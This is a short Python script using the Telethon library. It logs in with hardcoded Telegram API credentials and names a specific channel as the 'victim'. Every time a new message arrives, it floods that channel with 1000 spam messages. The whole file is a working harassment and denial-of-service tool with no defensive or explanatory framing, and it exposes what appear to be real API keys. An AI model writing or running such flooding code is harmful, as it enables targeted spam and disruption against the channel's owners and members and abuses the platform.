from telethon import TelegramClient, events

api_id = 26025426  # Your provided API ID
api_hash = '16fcb1405a69012b66895bfbe8fe45f2'  # Your provided API Hash

client = TelegramClient('flood_bot', api_id, api_hash)
client.start()

target_channel = '@teambdcyberninja'  # Victim's Telegram channel

# Function to flood the channel with spam
@client.on(events.NewMessage)
async def flood(event):
    for _ in range(1000):
        await client.send_message(target_channel, 'This is spam!')

client.run_until_disconnected()  # Ensure this line is not broken
